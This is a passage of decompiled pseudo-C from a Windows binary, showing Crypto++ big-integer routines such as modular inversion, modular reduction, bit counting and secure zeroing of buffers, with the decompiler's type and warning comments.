    v8 = v3 % v6;
    v9 = v7 * (v3 / v6);
    v3 = v8;
    v5 += v9;
    if ( !v8 )
      return 0i64;
    if ( v8 == 1 )
      return a2 - v5;
    v10 = v5 * (v6 / v8);
    v6 %= v8;
    v7 += v10;
    if ( !v6 )
      return 0i64;
  }
  return v7;
}

//----- (000000013F11EF70) ----------------------------------------------------
// write access to const memory has been detected, the output may be wrong!
__int64 __fastcall sub_13F11EF70(__int64 a1, __int64 a2, __int64 a3)
{
  __int64 v6; // rdi
  unsigned __int64 v7; // rcx
  unsigned __int64 v8; // rbx
  __m128i *v9; // r12
  __int64 v10; // r9
  const __m128i *v11; // r8
  __m128i *v12; // rsi
  unsigned int v13; // eax
  unsigned __int64 v14; // rax
  __int64 *v15; // rcx
  __int64 v16; // rax
  __m128i *v17; // rcx
  __int64 v18; // rcx
  _QWORD *v19; // rax
  _QWORD *v20; // rax
  __int64 v22; // rax
  unsigned __int64 v23; // rcx
  __int64 v24; // rdx
  unsigned __int64 v25; // rax
  char *v26; // rcx
  __int64 v27; // rax
  char v28; // bl
  unsigned __int64 v29; // r15
  unsigned __int64 v30; // r12
  __m128i *v31; // rax
  unsigned __int64 v32; // rcx
  __m128i *v33; // rdi
  _QWORD *v34; // rax
  char *v35; // r8
  char *v36; // rdx
  _QWORD *v37; // rax
  unsigned __int64 v38; // rcx
  __int64 v39; // rdi
  _QWORD *v40; // rax
  unsigned __int64 v41; // rsi
  char v42; // bl
  unsigned __int64 v43; // rcx
  __int64 v44; // rdx
  unsigned __int64 v45; // rcx
  __int64 v46; // rdx
  __int64 v47; // rdx
  unsigned __int64 v48; // rcx
  __int64 v49; // rdx
  __int64 v50; // rdx
  unsigned __int64 v51; // rcx
  __int64 v52; // rdx
  unsigned __int64 v53; // rcx
  __int64 v54; // rdx
  __int64 (__fastcall **v56)(); // [rsp+38h] [rbp-C8h] BYREF
  char v57[8]; // [rsp+40h] [rbp-C0h] BYREF
  unsigned __int64 v58; // [rsp+48h] [rbp-B8h]
  unsigned __int64 v59; // [rsp+50h] [rbp-B0h]
  __m128i *v60; // [rsp+58h] [rbp-A8h]
  int v61; // [rsp+60h] [rbp-A0h]
  __int64 (__fastcall **v62)(); // [rsp+68h] [rbp-98h] BYREF
  __int64 v63; // [rsp+70h] [rbp-90h] BYREF
  unsigned __int64 v64; // [rsp+78h] [rbp-88h]
  __m128i *v65; // [rsp+80h] [rbp-80h]
  void *v66; // [rsp+88h] [rbp-78h]
  int v67; // [rsp+90h] [rbp-70h]
  char v68[16]; // [rsp+98h] [rbp-68h] BYREF
  unsigned __int64 v69; // [rsp+A8h] [rbp-58h]
  unsigned __int64 v70; // [rsp+B0h] [rbp-50h]
  char *v71; // [rsp+B8h] [rbp-48h]
  int v72; // [rsp+C0h] [rbp-40h]
  __int64 (__fastcall **v73)(); // [rsp+C8h] [rbp-38h] BYREF
  char v74[8]; // [rsp+D0h] [rbp-30h] BYREF
  __m128i si128; // [rsp+D8h] [rbp-28h]
  void *v76; // [rsp+E8h] [rbp-18h]
  int v77; // [rsp+F0h] [rbp-10h]
  __int64 (__fastcall **v78)(); // [rsp+F8h] [rbp-8h] BYREF
  char v79[8]; // [rsp+100h] [rbp+0h] BYREF
  unsigned __int64 v80; // [rsp+108h] [rbp+8h]
  unsigned __int64 v81; // [rsp+110h] [rbp+10h]
  void *v82; // [rsp+118h] [rbp+18h]
  int v83; // [rsp+120h] [rbp+20h]
  __int64 v84; // [rsp+128h] [rbp+28h]
  int v85; // [rsp+130h] [rbp+30h] BYREF
  unsigned __int64 v86; // [rsp+140h] [rbp+40h]
  unsigned __int64 v87; // [rsp+148h] [rbp+48h]
  void *v88; // [rsp+150h] [rbp+50h]
  char v89[8]; // [rsp+160h] [rbp+60h] BYREF
  unsigned __int64 v90; // [rsp+170h] [rbp+70h]
  unsigned __int64 v91; // [rsp+178h] [rbp+78h]
  void *v92; // [rsp+180h] [rbp+80h]

  v84 = -2i64;
  v6 = *(_QWORD *)(a3 + 24);
  if ( v6 && (**(_BYTE **)(a3 + 32) & 1) != 0 )
  {
    v63 = 0x1FFFFFFFFFFFFFFFi64;
    v64 = 4 * v6;
    v65 = (__m128i *)sub_13F123740((__int64)&v62, 4 * v6);
    v7 = *(_QWORD *)(a3 + 24);
    v56 = off_13F185278;
    v8 = sub_13F122180(v7);
    v58 = 0x1FFFFFFFFFFFFFFFi64;
    v59 = v8;
    v9 = (__m128i *)sub_13F123740((__int64)v57, v8);
    v60 = v9;
    v61 = 0;
    v9->m128i_i64[0] = 0i64;
    if ( v8 != 1 )
      memset(&v9->m128i_u64[1], 0, 8 * (v8 - 1));
    v10 = *(_QWORD *)(a1 + 24);
    v11 = *(const __m128i **)(a1 + 32);
    v12 = v65;
    v13 = sub_13F114850(v9, v65, v11, v10, *(const __m128i **)(a3 + 32), *(_QWORD *)(a3 + 24));
    sub_13F11D1C0(v9, v9, v13, *(_QWORD *)(a3 + 32), *(_QWORD *)(a3 + 24));
    *(_QWORD *)a2 = off_13F185278;
    v14 = v8;
    if ( v8 )
    {
      v15 = &v9->m128i_i64[v8 - 1];
      do
      {
        if ( *v15 )
          break;
        --v15;
        --v14;
      }
      while ( v14 );
    }
    v16 = sub_13F122180((unsigned int)v14);
    *(_QWORD *)(a2 + 16) = 0x1FFFFFFFFFFFFFFFi64;
    *(_QWORD *)(a2 + 24) = v16;
    *(_QWORD *)(a2 + 32) = sub_13F123740(a2 + 8, v16);
    *(_DWORD *)(a2 + 40) = 0;
    v17 = *(__m128i **)(a2 + 32);
    if ( v17 != v9 )
      sub_13F10D330(v17, 8i64 * *(_QWORD *)(a2 + 24), v9, 8i64 * *(_QWORD *)(a2 + 24));
    if ( v8 > 0x1FFFFFFFFFFFFFFFi64 )
      v8 = 0x1FFFFFFFFFFFFFFFi64;
    memset(v9, 0, 8 * v8);
    sub_13F12E4D0((__int64)v9);
    v18 = 4 * v6;
    if ( (unsigned __int64)(4 * v6) > 0x1FFFFFFFFFFFFFFFi64 )
      v18 = 0x1FFFFFFFFFFFFFFFi64;
    if ( v12 )
    {
      memset(v12, 0, 8 * v18);
      sub_13F12E4D0((__int64)v12);
    }
    return a2;
  }
  if ( *(_DWORD *)(a3 + 40) != 1 )
  {
    v19 = *(_QWORD **)(a3 + 32);
    if ( !*v19 )
    {
      if ( v6 )
      {
        v20 = &v19[v6 - 1];
        do
        {
          if ( *v20 )
            break;
          --v20;
          --v6;
        }
        while ( v6 );
      }
      if ( !(_DWORD)v6 )
        goto LABEL_98;
    }
  }
  if ( !*(_QWORD *)(a1 + 24) || (**(_BYTE **)(a1 + 32) & 1) == 0 )
  {
LABEL_98:
    sub_13F112A00(a2, (__int64)&off_13F1C4398);
    return a2;
  }
  if ( *(_DWORD *)(a1 + 40) != 1 && !(unsigned int)sub_13F121140(a1, (__int64)&off_13F1C43C8) )
  {
    sub_13F112A00(a2, (__int64)&off_13F1C43C8);
    return a2;
  }
  v22 = sub_13F11FD00(a3, (__int64)&v56, a1);
  sub_13F11EF70(v22, (__int64)v68, a1);
  v23 = v59;
  if ( v58 < v59 )
    v23 = v58;
  v24 = (__int64)v60;
  if ( v60 )
  {
    memset(v60, 0, 8 * v23);
    sub_13F12E4D0(v24);
  }
  if ( v72 == 1 || *(_QWORD *)v71 )
    goto LABEL_44;
  v25 = v70;
  if ( v70 )
  {
    v26 = &v71[8 * v70 - 8];
    do
    {
      if ( *(_QWORD *)v26 )
        break;
      v26 -= 8;
      --v25;
    }
    while ( v25 );
  }
  if ( (_DWORD)v25 )
  {
LABEL_44:
    v56 = off_13F185278;
    v29 = 0x1FFFFFFFFFFFFFFFi64;
    v58 = 0x1FFFFFFFFFFFFFFFi64;
    v59 = 2i64;
    v31 = (__m128i *)sub_13F123740((__int64)v57, 2ui64);
    v60 = v31;
    v61 = 0;
    v31->m128i_i64[0] = 1i64;
    v31->m128i_i64[1] = 0i64;
    v32 = *(_QWORD *)(a1 + 24);
    if ( v32 < v70 )
      v32 = v70;
    v62 = off_13F185278;
    v33 = (__m128i *)sub_13F122180(v32);
    v64 = 0x1FFFFFFFFFFFFFFFi64;
    v65 = v33;
    v34 = (_QWORD *)sub_13F123740((__int64)&v63, (unsigned __int64)v33);
    v66 = v34;
    v67 = 0;
    *v34 = 0i64;
    if ( v33 != (__m128i *)1 )
      memset(v34 + 1, 0, 8i64 * ((_QWORD)v33 - 1));
    if ( *(_DWORD *)(a1 + 40) == 1 )
    {
      if ( v72 != 1 )
      {
        sub_13F120FA0((__int64)&v62, a1, (__int64)v68);
        v67 = 1;
        goto LABEL_55;
      }
      v35 = (char *)a1;
      v36 = v68;
    }
    else
    {
      v35 = v68;
      v36 = (char *)a1;
      if ( v72 == 1 )
      {
        sub_13F120FA0((__int64)&v62, a1, (__int64)v68);
LABEL_55:
        v73 = off_13F185278;
        si128 = _mm_load_si128((const __m128i *)&xmmword_13F185AD0);
        v37 = (_QWORD *)sub_13F123740((__int64)v74, 2ui64);
        v76 = v37;
        v77 = 0;
        v37[1] = 0i64;
        *v37 = 0i64;
        sub_13F120710((__int64)&v73, a3, (__int64)&v62);
        v30 = si128.m128i_u64[1];
        v38 = si128.m128i_u64[1];
        if ( si128.m128i_i64[1] < 2ui64 )
          v38 = 2i64;
        v78 = off_13F185278;
        v39 = sub_13F122180(v38);
        v80 = 0x1FFFFFFFFFFFFFFFi64;
        v81 = v39;
        v40 = (_QWORD *)sub_13F123740((__int64)v79, v39);
        v82 = v40;
        v83 = 0;
        *v40 = 0i64;
        if ( v39 != 1 )
          memset(v40 + 1, 0, 8 * (v39 - 1));
        if ( v77 == 1 )
          sub_13F1213E0((__int64)&v78, (__int64)&v56, (__int64)&v73);
        else
          sub_13F120FA0((__int64)&v78, (__int64)&v73, (__int64)&v56);
        v27 = sub_13F113B00((__int64)&v85, (__int64)&v78, a1);
        v28 = -4;
        goto LABEL_63;
      }
    }
    sub_13F1213E0((__int64)&v62, (__int64)v36, (__int64)v35);
    goto LABEL_55;
  }
  v27 = sub_13F112A00((__int64)v89, (__int64)&off_13F1C4398);
  v28 = 2;
  v29 = v58;
  v30 = si128.m128i_u64[1];
LABEL_63:
  v41 = v59;
  sub_13F112A00(a2, v27);
  v42 = v28 | 1;
  if ( (v42 & 0x40) != 0 )
  {
    v42 &= ~0x40u;
    v43 = v87;
    if ( v86 < v87 )
      v43 = v86;
    v44 = (__int64)v88;
    if ( v88 )
    {
      memset(v88, 0, 8 * v43);
      sub_13F12E4D0(v44);
    }
  }
  if ( (v42 & 0x20) != 0 )
  {
    v42 &= ~0x20u;
    v45 = v81;
    if ( v80 < v81 )
      v45 = v80;
    v46 = (__int64)v82;
    if ( v82 )
    {
      memset(v82, 0, 8 * v45);
      sub_13F12E4D0(v46);
    }
  }
  if ( (v42 & 0x10) != 0 )
  {
    v42 &= ~0x10u;
    if ( si128.m128i_i64[0] < v30 )
      v30 = si128.m128i_i64[0];
    v47 = (__int64)v76;
    if ( v76 )
    {
      memset(v76, 0, 8 * v30);
      sub_13F12E4D0(v47);
    }
  }
  if ( (v42 & 8) != 0 )
  {
    v42 &= ~8u;
    v48 = (unsigned __int64)v65;
    if ( v64 < (unsigned __int64)v65 )
      v48 = v64;
    v49 = (__int64)v66;
    if ( v66 )
    {
      memset(v66, 0, 8 * v48);
      sub_13F12E4D0(v49);
    }
  }
  if ( (v42 & 4) != 0 )
  {
    v42 &= ~4u;
    if ( v29 < v41 )
      v41 = v29;
    v50 = (__int64)v60;
    if ( v60 )
    {
      memset(v60, 0, 8 * v41);
      sub_13F12E4D0(v50);
    }
  }
  if ( (v42 & 2) != 0 )
  {
    v51 = v91;
    if ( v90 < v91 )
      v51 = v90;
    v52 = (__int64)v92;
    if ( v92 )
    {
      memset(v92, 0, 8 * v51);
      sub_13F12E4D0(v52);
    }
  }
  v53 = v70;
  if ( v69 < v70 )
    v53 = v69;
  v54 = (__int64)v71;
  if ( v71 )
  {
    memset(v71, 0, 8 * v53);
    sub_13F12E4D0(v54);
  }
  return a2;
}
// 13F11F015: write access to const memory at 13F1C4384 has been detected
// 13F11F0C6: write access to const memory at 13F1C4384 has been detected
// 13F11F2DA: write access to const memory at 13F1C4384 has been detected
// 13F11F34E: write access to const memory at 13F1C4384 has been detected
// 13F11F3FE: write access to const memory at 13F1C4384 has been detected
// 13F11F474: write access to const memory at 13F1C4384 has been detected
// 13F185278: using guessed type __int64 (__fastcall *off_13F185278[4])();
// 13F185AD0: using guessed type __int128 xmmword_13F185AD0;
// 13F1C4398: using guessed type __int64 (__fastcall *(*off_13F1C4398)[4])();
// 13F1C43C8: using guessed type __int64 (__fastcall *(*off_13F1C43C8)[4])();
// 13F1C43F0: using guessed type int dword_13F1C43F0;
// 13F11EF70: using guessed type char var_180[8];
// 13F11EF70: using guessed type char var_60[8];
// 13F11EF70: using guessed type char var_F0[8];
// 13F11EF70: using guessed type char var_C0[8];

//----- (000000013F11F6C0) ----------------------------------------------------
// write access to const memory has been detected, the output may be wrong!
_BOOL8 __fastcall sub_13F11F6C0(__int64 a1)
{
  _QWORD *v2; // rax
  int v3; // eax
  bool v4; // bl
  __int64 v5; // rcx
  __int64 v6; // rdx
  unsigned __int64 v7; // rcx
  __int64 v8; // rdx
  __int64 (__fastcall **v10)(); // [rsp+28h] [rbp-70h] BYREF
  char v11[8]; // [rsp+30h] [rbp-68h] BYREF
  __m128i si128; // [rsp+38h] [rbp-60h]
  void *v13; // [rsp+48h] [rbp-50h]
  int v14; // [rsp+50h] [rbp-48h]
  char v15[16]; // [rsp+58h] [rbp-40h] BYREF
  unsigned __int64 v16; // [rsp+68h] [rbp-30h]
  unsigned __int64 v17; // [rsp+70h] [rbp-28h]
  void *v18; // [rsp+78h] [rbp-20h]

  sub_13F1229C0(a1, (__int64)v15);
  v10 = off_13F185278;
  si128 = _mm_load_si128((const __m128i *)&xmmword_13F185AD0);
  v2 = (_QWORD *)sub_13F123740((__int64)v11, 2ui64);
  v13 = v2;
  v14 = 0;
  v2[1] = 0i64;
  *v2 = 0i64;
  sub_13F120710((__int64)&v10, (__int64)v15, (__int64)v15);
  if ( *(_DWORD *)(a1 + 40) == 1 )
  {
    if ( v14 == 1 )
      v3 = -(int)sub_13F121140(a1, (__int64)&v10);
    else
      v3 = -1;
  }
  else if ( v14 == 1 )
  {
    v3 = 1;
  }
  else
  {
    v3 = sub_13F121140(a1, (__int64)&v10);
  }
  v4 = v3 == 0;
  v5 = si128.m128i_i64[1];
  if ( si128.m128i_i64[0] < (unsigned __int64)si128.m128i_i64[1] )
    v5 = si128.m128i_i64[0];
  v6 = (__int64)v13;
  if ( v13 )
  {
    memset(v13, 0, 8 * v5);
    sub_13F12E4D0(v6);
  }
  v7 = v17;
  if ( v16 < v17 )
    v7 = v16;
  v8 = (__int64)v18;
  if ( v18 )
  {
    memset(v18, 0, 8 * v7);
    sub_13F12E4D0(v8);
  }
  return v4;
}
// 13F11F6F6: write access to const memory at 13F1C4384 has been detected
// 13F185278: using guessed type __int64 (__fastcall *off_13F185278[4])();
// 13F185AD0: using guessed type __int128 xmmword_13F185AD0;
// 13F11F6C0: using guessed type char var_68[8];

//----- (000000013F11F810) ----------------------------------------------------
char __fastcall sub_13F11F810(__int64 a1, __int64 a2)
{
  __int64 v2; // rax
  _QWORD *v3; // r8
  _QWORD *v4; // rcx

  v2 = *(_QWORD *)(a2 + 24);
  v3 = *(_QWORD **)(a2 + 32);
  if ( v2 )
  {
    v4 = &v3[v2 - 1];
    do
    {
      if ( *v4 )
        break;
      --v4;
      --v2;
    }
    while ( v2 );
  }
  if ( (_DWORD)v2 != 1 || *v3 != 1i64 )
    LOBYTE(v2) = 0;
  return v2;
}

//----- (000000013F11F850) ----------------------------------------------------
_BOOL8 __fastcall sub_13F11F850(__int64 a1, __int64 a2)
{
  __int64 v4; // rax
  __int64 v5; // rbx
  unsigned __int64 v6; // rcx
  __int64 v7; // rdx
  unsigned __int64 v8; // rcx
  __int64 v9; // rdx
  __int64 v10; // rax
  _QWORD *v11; // rdx
  _QWORD *v12; // rcx
  bool v13; // bl
  unsigned __int64 v14; // rcx
  __int64 v15; // rdx
  __int64 v17[3]; // [rsp+28h] [rbp-B0h] BYREF
  char v18[16]; // [rsp+40h] [rbp-98h] BYREF
  unsigned __int64 v19; // [rsp+50h] [rbp-88h]
  unsigned __int64 v20; // [rsp+58h] [rbp-80h]
  void *v21; // [rsp+60h] [rbp-78h]
  char v22[16]; // [rsp+70h] [rbp-68h] BYREF
  unsigned __int64 v23; // [rsp+80h] [rbp-58h]
  unsigned __int64 v24; // [rsp+88h] [rbp-50h]
  void *v25; // [rsp+90h] [rbp-48h]
  char v26[16]; // [rsp+A0h] [rbp-38h] BYREF
  unsigned __int64 v27; // [rsp+B0h] [rbp-28h]
  unsigned __int64 v28; // [rsp+B8h] [rbp-20h]
  void *v29; // [rsp+C0h] [rbp-18h]

  v17[1] = (__int64)&CryptoPP::AbstractRing<CryptoPP::Integer>::MultiplicativeGroupT::`vftable';
  v17[2] = (__int64)v17;
  sub_13F112CF0((__int64)v18);
  v17[0] = (__int64)&CryptoPP::EuclideanDomainOf<CryptoPP::Integer>::`vftable';
  sub_13F112CF0((__int64)v22);
  v4 = (*(__int64 (__fastcall **)(__int64 *, __int64, __int64))(v17[0] + 200))(v17, a2, a1 + 24);
  v5 = sub_13F112A00((__int64)v26, v4);
  v6 = v24;
  if ( v23 < v24 )
    v6 = v23;
  v7 = (__int64)v25;
  if ( v25 )
  {
    memset(v25, 0, 8 * v6);
    sub_13F12E4D0(v7);
  }
  v8 = v20;
  if ( v19 < v20 )
    v8 = v19;
  v9 = (__int64)v21;
  if ( v21 )
  {
    memset(v21, 0, 8 * v8);
    sub_13F12E4D0(v9);
  }
  v10 = *(_QWORD *)(v5 + 24);
  v11 = *(_QWORD **)(v5 + 32);
  if ( v10 )
  {
    v12 = &v11[v10 - 1];
    do
    {
      if ( *v12 )
        break;
      --v12;
      --v10;
    }
    while ( v10 );
  }
  v13 = (_DWORD)v10 == 1 && *v11 == 1i64;
  v14 = v28;
  if ( v27 < v28 )
    v14 = v27;
  v15 = (__int64)v29;
  if ( v29 )
  {
    memset(v29, 0, 8 * v14);
    sub_13F12E4D0(v15);
  }
  return v13;
}
// 13F1852F8: using guessed type void *CryptoPP::AbstractRing<CryptoPP::Integer>::MultiplicativeGroupT::`vftable';
// 13F185968: using guessed type void *CryptoPP::EuclideanDomainOf<CryptoPP::Integer>::`vftable';
// 13F11F850: using guessed type char var_98[16];
// 13F11F850: using guessed type char var_68[16];
// 13F11F850: using guessed type char var_38[16];

//----- (000000013F11F9D0) ----------------------------------------------------
__int64 __fastcall sub_13F11F9D0(__int64 a1, int a2)
{
  char v4; // si
  unsigned int v5; // eax
  unsigned int v6; // ebx
  unsigned __int64 v7; // rcx
  __int64 result; // rax
  __int64 v9; // rdx
  unsigned __int64 v10; // r14
  void *v11; // rbp
  int v12; // edx
  __int64 v13; // rax
  _QWORD *v14; // rcx
  int v15; // eax
  char v16; // r15
  unsigned __int64 v17; // rcx
  __int64 v18; // rdx
  char v19[16]; // [rsp+28h] [rbp-80h] BYREF
  unsigned __int64 v20; // [rsp+38h] [rbp-70h]
  unsigned __int64 v21; // [rsp+40h] [rbp-68h]
  _QWORD *v22; // [rsp+48h] [rbp-60h]
  int v23; // [rsp+50h] [rbp-58h]
  char v24[16]; // [rsp+58h] [rbp-50h] BYREF
  unsigned __int64 v25; // [rsp+68h] [rbp-40h]
  unsigned __int64 v26; // [rsp+70h] [rbp-38h]
  void *v27; // [rsp+78h] [rbp-30h]

  v4 = 0;
  v5 = sub_13F11C050(a1);
  v6 = 1;
  if ( v5 > 1 )
    v6 = v5;
  if ( !a2 )
    return v6;
  if ( *(_DWORD *)(a1 + 40) != 1 )
  {
    v7 = (unsigned __int64)(v6 - 1) >> 3;
    if ( v7 < *(_QWORD *)(a1 + 24)
      && ((*(_QWORD *)(*(_QWORD *)(a1 + 32) + 8 * v7) >> (8 * ((v6 - 1) & 7))) & 0x80u) != 0i64 )
    {
      ++v6;
    }
  }
  if ( *(_DWORD *)(a1 + 40) != 1 )
  {
    v11 = v22;
    v10 = v21;
    goto LABEL_27;
  }
  v9 = sub_13F1215D0((__int64)v24, 8 * v6 - 1);
  sub_13F112A00((__int64)v19, v9);
  v10 = v21;
  v11 = v22;
  v12 = v23;
  if ( v23 == 1 || *v22 )
    goto LABEL_18;
  v13 = v21;
  if ( v21 )
  {
    v14 = &v22[v21 - 1];
    do
    {
      if ( *v14 )
        break;
      --v14;
      --v13;
    }
    while ( v13 );
  }
  if ( (_DWORD)v13 )
  {
LABEL_18:
    v12 = 1 - v23;
    v23 = 1 - v23;
  }
  v4 = 11;
  if ( *(_DWORD *)(a1 + 40) != 1 )
  {
    if ( v12 == 1 )
      goto LABEL_27;
    v15 = sub_13F121140(a1, (__int64)v19);
LABEL_24:
    if ( v15 < 0 )
      goto LABEL_25;
LABEL_27:
    v16 = 0;
    goto LABEL_28;
  }
  if ( v12 == 1 )
  {
    v15 = -(int)sub_13F121140(a1, (__int64)v19);
    goto LABEL_24;
  }
LABEL_25:
  v16 = 1;
LABEL_28:
  if ( (v4 & 2) != 0 )
  {
    v4 &= ~2u;
    if ( v20 < v10 )
      v10 = v20;
    if ( v11 )
    {
      memset(v11, 0, 8 * v10);
      sub_13F12E4D0((__int64)v11);
    }
  }
  if ( (v4 & 1) != 0 )
  {
    v17 = v26;
    if ( v25 < v26 )
      v17 = v25;
    v18 = (__int64)v27;
    if ( v27 )
    {
      memset(v27, 0, 8 * v17);
      sub_13F12E4D0(v18);
    }
  }
  result = v6 + 1;
  if ( !v16 )
    return v6;
  return result;
}
// 13F11FA45: conditional instruction was optimized away because ebp.4!=0
// 13F11F9D0: using guessed type char var_50[16];

//----- (000000013F11FBB0) ----------------------------------------------------
__int64 __fastcall sub_13F11FBB0(__int64 a1, __int64 a2, __int64 a3)
{
  unsigned __int64 v6; // r8
  __int64 v7; // r8
  __int64 v8; // rdx

  v6 = *(_QWORD *)(a1 + 24);
  if ( v6 < *(_QWORD *)(a3 + 24) )
    v6 = *(_QWORD *)(a3 + 24);
  sub_13F112960(a2, 0i64, v6);
  if ( *(_DWORD *)(a1 + 40) == 1 )
  {
    if ( *(_DWORD *)(a3 + 40) != 1 )
    {
      sub_13F120FA0(a2, a1, a3);
      *(_DWORD *)(a2 + 40) = 1;
      return a2;
    }
    v7 = a1;
    v8 = a3;
  }
  else
  {
    v7 = a3;
    v8 = a1;
    if ( *(_DWORD *)(a3 + 40) == 1 )
    {
      sub_13F120FA0(a2, a1, a3);
      return a2;
    }
  }
  sub_13F1213E0(a2, v8, v7);
  return a2;
}

//----- (000000013F11FC80) ----------------------------------------------------
__int64 __fastcall sub_13F11FC80(__int64 a1, __int64 a2, __int64 a3)
{
  __int64 result; // rax
  __int64 v5; // rbx
  unsigned __int64 v6; // rcx
  __int64 v7; // rdx
  char v8[16]; // [rsp+28h] [rbp-40h] BYREF
  unsigned __int64 v9; // [rsp+38h] [rbp-30h]
  unsigned __int64 v10; // [rsp+40h] [rbp-28h]
  void *v11; // [rsp+48h] [rbp-20h]

  sub_13F11FD00(a2, (__int64)v8, a3);
  result = sub_13F113500(a1 + 72, (__int64)v8);
  v5 = result;
  v6 = v10;
  if ( v9 < v10 )
    v6 = v9;
  v7 = (__int64)v11;
  if ( v11 )
  {
    memset(v11, 0, 8 * v6);
    sub_13F12E4D0(v7);
    return v5;
  }
  return result;
}

//----- (000000013F11FD00) ----------------------------------------------------
// write access to const memory has been detected, the output may be wrong!
__int64 __fastcall sub_13F11FD00(__int64 a1, __int64 a2, __int64 a3)
{
  _QWORD *v6; // rax
  __int64 v7; // rcx
  __int64 v8; // rdx
  __int64 (__fastcall **v10)(); // [rsp+30h] [rbp-38h] BYREF
  char v11[8]; // [rsp+38h] [rbp-30h] BYREF
  __m128i si128; // [rsp+40h] [rbp-28h]
  void *v13; // [rsp+50h] [rbp-18h]
  int v14; // [rsp+58h] [rbp-10h]

  sub_13F112CF0(a2);
  v10 = off_13F185278;
  si128 = _mm_load_si128((const __m128i *)&xmmword_13F185AD0);
  v6 = (_QWORD *)sub_13F123740((__int64)v11, 2ui64);
  v13 = v6;
  v14 = 0;
  v6[1] = 0i64;
  *v6 = 0i64;
  sub_13F11CFD0(a2, (__int64)&v10, a1, a3);
  v7 = si128.m128i_i64[1];
  if ( si128.m128i_i64[0] < (unsigned __int64)si128.m128i_i64[1] )
    v7 = si128.m128i_i64[0];
  v8 = (__int64)v13;
  if ( v13 )
  {
    memset(v13, 0, 8 * v7);
    sub_13F12E4D0(v8);
  }
  return a2;
}
// 13F11FD4C: write access to const memory at 13F1C4384 has been detected
// 13F185278: using guessed type __int64 (__fastcall *off_13F185278[4])();
// 13F185AD0: using guessed type __int128 xmmword_13F185AD0;
// 13F11FD00: using guessed type char var_30[8];

//----- (000000013F11FDF0) ----------------------------------------------------
unsigned __int64 __fastcall sub_13F11FDF0(__int64 a1, unsigned __int64 a2)
{
  _QWORD *v4; // r8
  __int64 v5; // rbx
  _QWORD *v6; // rax
  unsigned __int64 v7; // rcx
  _QWORD *v8; // r14
  unsigned __int64 v9; // r9
  __int64 v10; // rdx
  unsigned __int64 *v11; // r8
  unsigned __int64 v13; // [rsp+20h] [rbp-78h] BYREF
  unsigned __int64 v14; // [rsp+28h] [rbp-70h]
  char pExceptionObject[64]; // [rsp+30h] [rbp-68h] BYREF

  if ( !a2 )
  {
    sub_13F112880((__int64)pExceptionObject);
    CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI3_AVDivideByZero_Integer_CryptoPP__);
  }
  v4 = *(_QWORD **)(a1 + 32);
  if ( ((a2 - 1) & a2) != 0 )
  {
    v5 = *(_QWORD *)(a1 + 24);
    if ( v5 )
    {
      v6 = &v4[v5 - 1];
      do
      {
        if ( *v6 )
          break;
        --v6;
        --v5;
      }
      while ( v5 );
    }
    v7 = 0i64;
    if ( a2 <= 5 )
    {
      v13 = 0i64;
      v10 = 0i64;
      v14 = 0i64;
      if ( (_DWORD)v5 )
      {
        v11 = &v4[(unsigned int)v5];
        do
        {
          v7 += *--v11;
          v10 += v7 < *v11;
          LODWORD(v5) = v5 - 1;
        }
        while ( (_DWORD)v5 );
        v13 = v7;
        v14 = v10;
      }
      v7 = sub_13F113CE0((__int64 *)&v13, a2);
    }
    else if ( (_DWORD)v5 )
    {
      v8 = &v4[(unsigned int)v5];
      do
      {
        v9 = *--v8;
        LODWORD(v5) = v5 - 1;
        if ( a2 >= 0x100000000i64 )
        {
          v13 = v9;
          v14 = v7;
          sub_13F112090((unsigned int *)&v13 + 1, a2, HIDWORD(a2));
          sub_13F112090((unsigned int *)&v13, a2, HIDWORD(a2));
          v7 = v13;
        }
        else
        {
          v7 = ((unsigned int)v9 + (((HIDWORD(v9) + ((v7 % (unsigned int)a2) << 32)) % (unsigned int)a2) << 32))
             % (unsigned int)a2;
        }
      }
      while ( (_DWORD)v5 );
    }
  }
  else
  {
    v7 = *v4 & (a2 - 1);
  }
  if ( *(_DWORD *)(a1 + 40) == 1 && v7 )
    return a2 - v7;
  return v7;
}

//----- (000000013F120000) ----------------------------------------------------
__int64 __fastcall sub_13F120000(
        __m128i *a1,
        unsigned __int64 *a2,
        unsigned __int64 *a3,
        unsigned __int64 *a4,
        unsigned __int64 *a5,
        unsigned __int64 a6)
{
  __int64 v11; // rbx
  __int64 result; // rax
  __m128i *v13; // r8

  sub_13F121EC0(a1, a2, a3, a5, a6);
  sub_13F120AC0(a2, &a2[a6], (__int64)a3, (unsigned __int64 *)a1, a4, a6);
  v11 = sub_13F13A520(a6, (__int64)a2, (__int64)&a3[a6], (__int64)a2);
  result = sub_13F13A4D0(a6, (__int64)&a2[a6], (__int64)a2, (__int64)a4);
  v13 = (__m128i *)&a2[a6 & -v11];
  if ( a1 != v13 )
    return sub_13F10D330(a1, 8 * a6, v13, 8 * a6);
  return result;
}

//----- (000000013F1200D0) ----------------------------------------------------
__int64 __fastcall sub_13F1200D0(__int64 a1, _QWORD *a2)
{
  sub_13F102D40((__int64)a2, a1);
  *a2 = &CryptoPP::AlgorithmParametersTemplate<CryptoPP::Integer>::`vftable';
  return sub_13F112A00((__int64)(a2 + 4), a1 + 32);
}
// 13F185A98: using guessed type void *CryptoPP::AlgorithmParametersTemplate<CryptoPP::Integer>::`vftable';

//----- (000000013F120120) ----------------------------------------------------
__int64 __fastcall sub_13F120120(__int64 a1, __int64 a2)
{
  __int64 result; // rax

  sub_13F102D40(a2, a1);
  *(_QWORD *)a2 = off_13F185AB8;
  result = *(unsigned int *)(a1 + 32);
  *(_DWORD *)(a2 + 32) = result;
  return result;
}
// 13F185AB8: using guessed type __int64 (__fastcall *off_13F185AB8[3])();

//----- (000000013F120160) ----------------------------------------------------
__int64 (__fastcall *(**sub_13F120160())[4])()
{
  return &off_13F1C43C8;
}
// 13F1C43C8: using guessed type __int64 (__fastcall *(*off_13F1C43C8)[4])();

//----- (000000013F120170) ----------------------------------------------------
__int64 __fastcall sub_13F120170(__int64 a1)
{
  __int64 v2; // rax
  __int64 v3; // rbx
  unsigned __int64 v4; // rcx
  __int64 v5; // rdx
  unsigned __int64 v6; // rcx
  __int64 v7; // rdx
  char v9[16]; // [rsp+28h] [rbp-70h] BYREF
  unsigned __int64 v10; // [rsp+38h] [rbp-60h]
  unsigned __int64 v11; // [rsp+40h] [rbp-58h]
  void *v12; // [rsp+48h] [rbp-50h]
  char v13[16]; // [rsp+58h] [rbp-40h] BYREF
  unsigned __int64 v14; // [rsp+68h] [rbp-30h]
  unsigned __int64 v15; // [rsp+70h] [rbp-28h]
  void *v16; // [rsp+78h] [rbp-20h]

